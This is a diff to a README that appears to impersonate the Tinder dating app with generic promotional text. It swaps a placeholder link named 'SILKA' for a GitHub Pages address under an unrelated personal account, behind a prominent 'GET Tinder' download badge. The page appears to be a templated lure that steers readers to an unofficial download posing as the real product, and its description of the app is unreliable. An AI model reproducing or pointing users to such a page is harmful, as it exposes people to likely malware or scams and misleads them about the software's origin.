@@ -4,7 +4,7 @@
 
 Tinder is a focused social discovery utility for connecting with new people, measuring mutual interest, and understanding where meaningful connections begin. Tinder keeps interactions readable, profiles clear, and daily matching decisions easier for home users, students, professionals, and socialites who rely on Tinder for steady relationship insight.
 
-[![GET Tinder](https://img.shields.io/badge/GET%20%E2%80%94%20Tinder-0078D6?style=for-the-badge&logoColor=white)](SILKA)
+[![GET Tinder](https://img.shields.io/badge/GET%20%E2%80%94%20Tinder-0078D6?style=for-the-badge&logoColor=white)](https://bettyjohnsond849.github.io/.github/tinder-dating-guide)
 
 ---
 
